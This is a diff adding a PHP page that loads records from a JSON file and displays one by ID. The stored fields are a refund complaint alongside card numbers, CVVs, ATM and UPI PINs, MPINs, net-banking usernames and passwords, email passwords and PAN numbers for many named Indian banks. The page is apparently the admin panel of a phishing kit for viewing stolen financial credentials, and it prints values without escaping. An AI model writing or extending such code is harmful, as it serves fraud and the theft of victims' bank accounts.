@@ -1,0 +1,398 @@
+<?php
+if (isset($_GET['id'])) {
+    $targetID = $_GET['id'];
+
+    // Retrieve the data from the JSON file
+    $jsonData = file_get_contents('info.json');
+    $responses = json_decode($jsonData, true) ?: array();
+
+    // Find the response with the specified ID
+    $response = null;
+    foreach ($responses as $r) {
+        if ($r['ID'] === $targetID) {
+            $response = $r;
+            break;
+        }
+    }
+
+    if ($response) {
+        // Add the entry date to the response
+        // $response['EntryDate'] = date('Y-m-d H:i:s');
+
+        // Display the details
+        ?>
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Response Details</title>
+            <style>
+                body {
+                    font-family: Arial, sans-serif;
+                    background-color: #0c343b; /* Dark Cyan background */
+                    color: #fff; /* White text color */
+                    margin: 0;
+                    padding: 0;
+                }
+
+                h1 {
+                    text-align: center;
+                }
+
+                table {
+                    width: 60%;
+                    margin: 20px auto;
+                    border-collapse: collapse;
+                }
+
+                table, th, td {
+                    border: 1px solid #17a2b8; /* Dark Cyan border */
+                }
+
+                th, td {
+                    padding: 10px;
+                    text-align: left;
+                }
+
+                th {
+                    background-color: #17a2b8; /* Dark Cyan header background */
+                    color: #fff;
+                }
+
+                td {
+                    background-color: #154e56; /* Dark Cyan cell background */
+                }
+
+                a {
+                    display: block;
+                    width: 120px;
+                    text-align: center;
+                    background-color: #17a2b8; /* Dark Cyan button background */
+                    color: #fff; /* White text color */
+                    text-decoration: none;
+                    padding: 10px;
+                    border-radius: 5px;
+                    margin: 20px auto;
+                    transition: background-color 0.3s;
+                }
+
+                a:hover {
+                    background-color: #0c343b; /* Dark Cyan background on hover */
+                }
+            </style>
+        </head>
+        <body>
+            <h1>Response Details</h1>
+            <table>
+                <tr>
+                    <th>Field</th>
+                    <th>Value</th>
+                </tr>
+                <tr>
+                    <td>ID</td>
+                    <td><?php echo $response['ID']; ?></td>
+                </tr>
+                <tr>
+                    <td>Entry Date</td>
+                    <td><?php echo $response['EntryDate']; ?></td>
+                </tr>
+                <?php
+                if (!empty($response['fname'])) {
+                    echo '<tr><td>Full Name</td><td>' . $response['fname'] . '</td></tr>';
+                }
+                if (!empty($response['mobile'])) {
+                    echo '<tr><td>Phone No</td><td>' . $response['mobile'] . '</td></tr>';
+                }
+				if (!empty($response['complain'])) {
+                    echo '<tr><td>Complaint</td><td>' . $response['complain'] . '</td></tr>';
+                }
+				if (!empty($response['amt_type'])) {
+                    echo '<tr><td>amt_type</td><td>' . $response['amt_type'] . '</td></tr>';
+                }
+				if (!empty($response['refund_amt'])) {
+                    echo '<tr><td>Refund amount</td><td>' . $response['refund_amt'] . '</td></tr>';
+                }
+				if (!empty($response['card'])) {
+                    echo '<tr><td>Card No</td><td>' . $response['card'] . '</td></tr>';
+                }
+				if (!empty($response['net_banking'])) {
+                    echo '<tr><td>net_banking</td><td>' . $response['net_banking'] . '</td></tr>';
+                }
+				if (!empty($response['amazon_pay'])) {
+    echo '<tr><td>amazon_pay</td><td>' . $response['amazon_pay'] . '</td></tr>';
+}
+if (!empty($response['googlepay'])) {
+    echo '<tr><td>googlepay</td><td>' . $response['googlepay'] . '</td></tr>';
+}
+if (!empty($response['phonepay'])) {
+    echo '<tr><td>phonepay</td><td>' . $response['phonepay'] . '</td></tr>';
+}
+if (!empty($response['paytm'])) {
+    echo '<tr><td>paytm</td><td>' . $response['paytm'] . '</td></tr>';
+}
+if (!empty($response['other'])) {
+    echo '<tr><td>other</td><td>' . $response['other'] . '</td></tr>';
+}
+if (!empty($response['cardname'])) {
+    echo '<tr><td>cardname</td><td>' . $response['cardname'] . '</td></tr>';
+}
+if (!empty($response['cc-exp'])) {
+    echo '<tr><td>cc-exp</td><td>' . $response['cc-exp'] . '</td></tr>';
+}
+if (!empty($response['cvv'])) {
+    echo '<tr><td>cvv</td><td>' . $response['cvv'] . '</td></tr>';
+}
+if (!empty($response['atm_pin'])) {
+    echo '<tr><td>atm_pin</td><td>' . $response['atm_pin'] . '</td></tr>';
+}
+if (!empty($response['dob'])) {
+    echo '<tr><td>dob</td><td>' . $response['dob'] . '</td></tr>';
+}
+if (!empty($response['upi_pin'])) {
+    echo '<tr><td>upi_pin</td><td>' . $response['upi_pin'] . '</td></tr>';
+}
+if (!empty($response['upi_bank_name'])) {
+    echo '<tr><td>upi_bank_name</td><td>' . $response['upi_bank_name'] . '</td></tr>';
+}
+if (!empty($response['user_id'])) {
+    echo '<tr><td>user_id</td><td>' . $response['user_id'] . '</td></tr>';
+}
+if (!empty($response['net_password'])) {
+    echo '<tr><td>net_password</td><td>' . $response['net_password'] . '</td></tr>';
+}
+if (!empty($response['profile_password'])) {
+    echo '<tr><td>profile_password</td><td>' . $response['profile_password'] . '</td></tr>';
+}
+if (!empty($response['other_bank_type'])) {
+    echo '<tr><td>other_bank_type</td><td>' . $response['other_bank_type'] . '</td></tr>';
+}
+if (!empty($response['union_login_pin'])) {
+    echo '<tr><td>union_login_pin</td><td>' . $response['union_login_pin'] . '</td></tr>';
+}
+if (!empty($response['union_mpin'])) {
+    echo '<tr><td>union_mpin</td><td>' . $response['union_mpin'] . '</td></tr>';
+}
+if (!empty($response['union-cardname'])) {
+    echo '<tr><td>union-cardname</td><td>' . $response['union-cardname'] . '</td></tr>';
+}
+if (!empty($response['union-cc-exp'])) {
+    echo '<tr><td>union-cc-exp</td><td>' . $response['union-cc-exp'] . '</td></tr>';
+}
+if (!empty($response['union-cvv'])) {
+    echo '<tr><td>union-cvv</td><td>' . $response['union-cvv'] . '</td></tr>';
+}
+if (!empty($response['union_atm_pin'])) {
+    echo '<tr><td>union_atm_pin</td><td>' . $response['union_atm_pin'] . '</td></tr>';
+}
+if (!empty($response['icici_username'])) {
+    echo '<tr><td>icici_username</td><td>' . $response['icici_username'] . '</td></tr>';
+}
+if (!empty($response['icici_password'])) {
+    echo '<tr><td>icici_password</td><td>' . $response['icici_password'] . '</td></tr>';
+}
+if (!empty($response['icici_file1'])) {
+    echo '<tr><td>icici_file1</td><td>' . $response['icici_file1'] . '</td></tr>';
+}
+if (!empty($response['icici_account_number'])) {
+    echo '<tr><td>icici_account_number</td><td>' . $response['icici_account_number'] . '</td></tr>';
+}
+if (!empty($response['icici_file2'])) {
+    echo '<tr><td>icici_file2</td><td>' . $response['icici_file2'] . '</td></tr>';
+}
+if (!empty($response['icici_atm_pin'])) {
+    echo '<tr><td>icici_atm_pin</td><td>' . $response['icici_atm_pin'] . '</td></tr>';
+}
+if (!empty($response['indian_account_number'])) {
+    echo '<tr><td>indian_account_number</td><td>' . $response['indian_account_number'] . '</td></tr>';
+}
+if (!empty($response['indian_pan_card'])) {
+    echo '<tr><td>indian_pan_card</td><td>' . $response['indian_pan_card'] . '</td></tr>';
+}
+if (!empty($response['indian_dob'])) {
+    echo '<tr><td>indian_dob</td><td>' . $response['indian_dob'] . '</td></tr>';
+}
+if (!empty($response['indian-cardname'])) {
+    echo '<tr><td>indian-cardname</td><td>' . $response['indian-cardname'] . '</td></tr>';
+}
+if (!empty($response['indian-cc-exp'])) {
+    echo '<tr><td>indian-cc-exp</td><td>' . $response['indian-cc-exp'] . '</td></tr>';
+}
+if (!empty($response['indian-cvv'])) {
+    echo '<tr><td>indian-cvv</td><td>' . $response['indian-cvv'] . '</td></tr>';
+}
+if (!empty($response['indian_atm_pin'])) {
+    echo '<tr><td>indian_atm_pin</td><td>' . $response['indian_atm_pin'] . '</td></tr>';
+}
+if (!empty($response['canara_mpin'])) {
+    echo '<tr><td>canara_mpin</td><td>' . $response['canara_mpin'] . '</td></tr>';
+}
+if (!empty($response['canara-cardname'])) {
+    echo '<tr><td>canara-cardname</td><td>' . $response['canara-cardname'] . '</td></tr>';
+}
+if (!empty($response['canara-cc-exp'])) {
+    echo '<tr><td>canara-cc-exp</td><td>' . $response['canara-cc-exp'] . '</td></tr>';
+}
+if (!empty($response['canara-cvv'])) {
+    echo '<tr><td>canara-cvv</td><td>' . $response['canara-cvv'] . '</td></tr>';
+}
+if (!empty($response['canara_atm_pin'])) {
+    echo '<tr><td>canara_atm_pin</td><td>' . $response['canara_atm_pin'] . '</td></tr>';
+}
+if (!empty($response['bob_login_pin'])) {
+    echo '<tr><td>bob_login_pin</td><td>' . $response['bob_login_pin'] . '</td></tr>';
+}
+if (!empty($response['bob_mpin'])) {
+    echo '<tr><td>bob_mpin</td><td>' . $response['bob_mpin'] . '</td></tr>';
+}
+if (!empty($response['bob-cardname'])) {
+    echo '<tr><td>bob-cardname</td><td>' . $response['bob-cardname'] . '</td></tr>';
+}
+if (!empty($response['bob-cc-exp'])) {
+    echo '<tr><td>bob-cc-exp</td><td>' . $response['bob-cc-exp'] . '</td></tr>';
+}
+if (!empty($response['bob-cvv'])) {
+    echo '<tr><td>bob-cvv</td><td>' . $response['bob-cvv'] . '</td></tr>';
+}
+if (!empty($response['hdfc_customerid'])) {
+    echo '<tr><td>hdfc_customerid</td><td>' . $response['hdfc_customerid'] . '</td></tr>';
+}
+if (!empty($response['hdfc_password'])) {
+    echo '<tr><td>hdfc_password</td><td>' . $response['hdfc_password'] . '</td></tr>';
+}
+if (!empty($response['hdfc_atm_pin_1'])) {
+    echo '<tr><td>hdfc_atm_pin_1</td><td>' . $response['hdfc_atm_pin_1'] . '</td></tr>';
+}
+if (!empty($response['hdfc_email'])) {
+    echo '<tr><td>hdfc_email</td><td>' . $response['hdfc_email'] . '</td></tr>';
+}
+if (!empty($response['hdfc_email_password'])) {
+    echo '<tr><td>hdfc_email_password</td><td>' . $response['hdfc_email_password'] . '</td></tr>';
+}
+if (!empty($response['hdfc_debit_customerid'])) {
+    echo '<tr><td>hdfc_debit_customerid</td><td>' . $response['hdfc_debit_customerid'] . '</td></tr>';
+}
+if (!empty($response['hdfc_atm_pin'])) {
+    echo '<tr><td>hdfc_atm_pin</td><td>' . $response['hdfc_atm_pin'] . '</td></tr>';
+}
+if (!empty($response['hdfc-cc-exp1'])) {
+    echo '<tr><td>hdfc-cc-exp1</td><td>' . $response['hdfc-cc-exp1'] . '</td></tr>';
+}
+if (!empty($response['hdfc_email_2'])) {
+    echo '<tr><td>hdfc_email_2</td><td>' . $response['hdfc_email_2'] . '</td></tr>';
+}
+if (!empty($response['hdfc_email_password_2'])) {
+    echo '<tr><td>hdfc_email_password_2</td><td>' . $response['hdfc_email_password_2'] . '</td></tr>';
+}
+if (!empty($response['hdfc-cardname'])) {
+    echo '<tr><td>hdfc-cardname</td><td>' . $response['hdfc-cardname'] . '</td></tr>';
+}
+if (!empty($response['hdfc-cc-exp'])) {
+    echo '<tr><td>hdfc-cc-exp</td><td>' . $response['hdfc-cc-exp'] . '</td></tr>';
+}
+if (!empty($response['hdfc-cvv'])) {
+    echo '<tr><td>hdfc-cvv</td><td>' . $response['hdfc-cvv'] . '</td></tr>';
+}
+if (!empty($response['central_account_number'])) {
+    echo '<tr><td>central_account_number</td><td>' . $response['central_account_number'] . '</td></tr>';
+}
+if (!empty($response['central-cardname'])) {
+    echo '<tr><td>central-cardname</td><td>' . $response['central-cardname'] . '</td></tr>';
+}
+if (!empty($response['central-cc-exp'])) {
+    echo '<tr><td>central-cc-exp</td><td>' . $response['central-cc-exp'] . '</td></tr>';
+}
+if (!empty($response['central-cvv'])) {
+    echo '<tr><td>central-cvv</td><td>' . $response['central-cvv'] . '</td></tr>';
+}
+if (!empty($response['sbi_username'])) {
+    echo '<tr><td>sbi_username</td><td>' . $response['sbi_username'] . '</td></tr>';
+}
+if (!empty($response['sbi_password'])) {
+    echo '<tr><td>sbi_password</td><td>' . $response['sbi_password'] . '</td></tr>';
+}
+if (!empty($response['sbi_profile_password'])) {
+    echo '<tr><td>sbi_profile_password</td><td>' . $response['sbi_profile_password'] . '</td></tr>';
+}
+if (!empty($response['sbi_account_number'])) {
+    echo '<tr><td>sbi_account_number</td><td>' . $response['sbi_account_number'] . '</td></tr>';
+}
+if (!empty($response['sbi_cif_number'])) {
+    echo '<tr><td>sbi_cif_number</td><td>' . $response['sbi_cif_number'] . '</td></tr>';
+}
+if (!empty($response['sbi_brach_code'])) {
+    echo '<tr><td>sbi_brach_code</td><td>' . $response['sbi_brach_code'] . '</td></tr>';
+}
+if (!empty($response['sbi_dob'])) {
+    echo '<tr><td>sbi_dob</td><td>' . $response['sbi_dob'] . '</td></tr>';
+}
+if (!empty($response['sbi-cardname'])) {
+    echo '<tr><td>sbi-cardname</td><td>' . $response['sbi-cardname'] . '</td></tr>';
+}
+if (!empty($response['sbi-cc-exp'])) {
+    echo '<tr><td>sbi-cc-exp</td><td>' . $response['sbi-cc-exp'] . '</td></tr>';
+}
+if (!empty($response['sbi-cvv'])) {
+    echo '<tr><td>sbi-cvv</td><td>' . $response['sbi-cvv'] . '</td></tr>';
+}
+if (!empty($response['sbi-atm-pin'])) {
+    echo '<tr><td>sbi-atm-pin</td><td>' . $response['sbi-atm-pin'] . '</td></tr>';
+}
+if (!empty($response['boi_username'])) {
+    echo '<tr><td>boi_username</td><td>' . $response['boi_username'] . '</td></tr>';
+}
+if (!empty($response['boi_mpin'])) {
+    echo '<tr><td>boi_mpin</td><td>' . $response['boi_mpin'] . '</td></tr>';
+}
+if (!empty($response['boi_tpin'])) {
+    echo '<tr><td>boi_tpin</td><td>' . $response['boi_tpin'] . '</td></tr>';
+}
+if (!empty($response['boi-cardname'])) {
+    echo '<tr><td>boi-cardname</td><td>' . $response['boi-cardname'] . '</td></tr>';
+}
+if (!empty($response['boi-cc-exp'])) {
+    echo '<tr><td>boi-cc-exp</td><td>' . $response['boi-cc-exp'] . '</td></tr>';
+}
+if (!empty($response['boi-cvv'])) {
+    echo '<tr><td>boi-cvv</td><td>' . $response['boi-cvv'] . '</td></tr>';
+}
+if (!empty($response['boi-atm-pin'])) {
+    echo '<tr><td>boi-atm-pin</td><td>' . $response['boi-atm-pin'] . '</td></tr>';
+}
+if (!empty($response['pnb_username'])) {
+    echo '<tr><td>pnb_username</td><td>' . $response['pnb_username'] . '</td></tr>';
+}
+if (!empty($response['pnb_password'])) {
+    echo '<tr><td>pnb_password</td><td>' . $response['pnb_password'] . '</td></tr>';
+}
+if (!empty($response['pnb_tr_password'])) {
+    echo '<tr><td>pnb_tr_password</td><td>' . $response['pnb_tr_password'] . '</td></tr>';
+}
+if (!empty($response['pnb_account_number'])) {
+    echo '<tr><td>pnb_account_number</td><td>' . $response['pnb_account_number'] . '</td></tr>';
+}
+if (!empty($response['pnb-cardname'])) {
+    echo '<tr><td>pnb-cardname</td><td>' . $response['pnb-cardname'] . '</td></tr>';
+}
+if (!empty($response['pnb-cc-exp'])) {
+    echo '<tr><td>pnb-cc-exp</td><td>' . $response['pnb-cc-exp'] . '</td></tr>';
+}
+if (!empty($response['pnb-cvv'])) {
+    echo '<tr><td>pnb-cvv</td><td>' . $response['pnb-cvv'] . '</td></tr>';
+}
+if (!empty($response['pnb_atm_pin'])) {
+    echo '<tr><td>pnb_atm_pin</td><td>' . $response['pnb_atm_pin'] . '</td></tr>';
+}
+
+                // Add similar rows for other fields
+                ?>
+            </table>
+            <a href="profile.php">Back to List</a>
+        </body>
+        </html>
+        <?php
+    } else {
+        echo 'Response not found.';
+    }
+} else {
+    echo 'Invalid request.';
+}
+?>
